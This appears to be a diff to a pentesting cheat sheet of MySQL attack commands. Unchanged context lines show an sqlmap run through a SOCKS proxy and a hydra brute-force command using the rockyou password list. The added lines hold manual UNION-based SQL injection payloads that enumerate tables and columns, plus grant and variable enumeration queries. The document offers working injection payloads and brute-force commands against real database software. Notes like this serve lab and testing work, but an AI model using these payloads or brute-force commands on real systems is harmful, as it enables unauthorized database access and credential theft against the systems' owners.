@@ -19,3 +19,25 @@ sqlmap -u http://rhost?id= --proxy socks5://127.0.0.1:1080
 ```bash
 hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $rhost mysql
 ```
+
+## dump big tables with each column on seperate line when connected with mysql client
+
+Replace ; with \G
+
+```sql
+select * from users\G
+```
+
+## manual sql injection
+
+```bash
+' or 1=1 union all select 1,2,3,4,5,6,table_name,8 from information_schema.tables --
+' or 1=1 union all select 1,2,3,4,5,6,column_name,8 from information_schema.columns where table_name='some_table' --
+```
+
+### manual sql enumeration
+
+```sql
+show Grants;
+show variables;
+```
